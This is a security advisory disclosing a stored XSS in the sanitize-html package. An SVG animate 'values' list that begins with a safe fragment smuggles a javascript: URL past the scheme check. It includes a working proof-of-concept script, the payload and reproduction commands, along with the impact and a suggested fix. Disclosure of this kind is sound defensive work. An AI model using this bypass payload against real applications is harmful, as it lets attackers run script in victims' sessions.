# [M] ApostropheCMS: Stored XSS via SVG SMIL URI-list scheme-policy bypass

## Summary
Severity: Medium
Advisory: GHSA-g8qq-57p8-ggw5
CVE: CVE-2026-84371
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-09-01
Source: https://github.com/advisories/GHSA-g8qq-57p8-ggw5
Type: github-advisory

## Affected
- npm: `sanitize-html` — affected >=1.9.0 <2.17.7

## Details
### Summary
When SVG animation is allowed, `attributeName="href"` makes `values` a list of URL destinations. `sanitize-html` accepts a list that starts with a safe fragment even when `values` is explicitly scheme-checked, allowing a later `javascript:` destination to execute when the sanitized link is activated.

### Details
`index.js:371-383` validates each attribute as one flat URL. It does not recognize that `attributeName="href"` gives the sibling `values` attribute SMIL URI-list semantics. For `values="#safe;javascript:..."`, the leading fragment passes the flat check and the complete list is retained.

### PoC
This was reproduced with `sanitize-html@2.17.6` and Chromium 150.0.7871.124. The configuration adds SVG animation to the defaults and applies the existing scheme policy to `values`; it does not allow `javascript:`. Save this as `poc.js`:

```js
const sanitize = require('sanitize-html');

const input = `<svg><a><animate attributeName="href" values="#safe;javascript:alert('XSS')" dur=".01s" fill="freeze"></animate><text y="30">Click me</text></a></svg>`;
const output = sanitize(input, {
  allowedTags: sanitize.defaults.allowedTags.concat(['svg', 'animate', 'text']),
  allowedAttributes: {
    ...sanitize.defaults.allowedAttributes,
    animate: ['attributename', 'values', 'dur', 'fill'],
    text: ['y']
  },
  allowedSchemesAppliedToAttributes:
    sanitize.defaults.allowedSchemesAppliedToAttributes.concat(['values'])
});
console.log(output);
```

Install and run it, then open `poc.html` and click `Click me`:

```sh
npm install sanitize-html@2.17.6
node poc.js > poc.html
```

The output retains the `javascript:` entry, and clicking the sanitized SVG displays `XSS`. With `input` changed to `<a href="javascript:alert(1)">control</a>`, the same configuration removes `href`.

### Impact
In an application that accepts attacker-authored SVG animation, the attacker can store this payload without scripts or event handlers. A victim who activates the sanitized link executes JavaScript in the application's origin despite the configured scheme policy.

### Suggested fix
Reject `attributeName` values selecting `href` or `xlink:href` on SVG `animate` and `set`, while retaining safe targets such as `fill`. Add `values`, `from`, and `to` regression cases.

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-g8qq-57p8-ggw5
- https://github.com/apostrophecms/apostrophe/pull/5552
- https://github.com/apostrophecms/apostrophe/commit/1135516a1a4a8f9638641c460488a43d8af20081
- https://github.com/apostrophecms/apostrophe/commit/38ff1106c8176b16c2da9872acd9b449adcbb949
- https://github.com/apostrophecms/apostrophe
- https://github.com/apostrophecms/apostrophe/blob/main/packages/sanitize-html/CHANGELOG.md
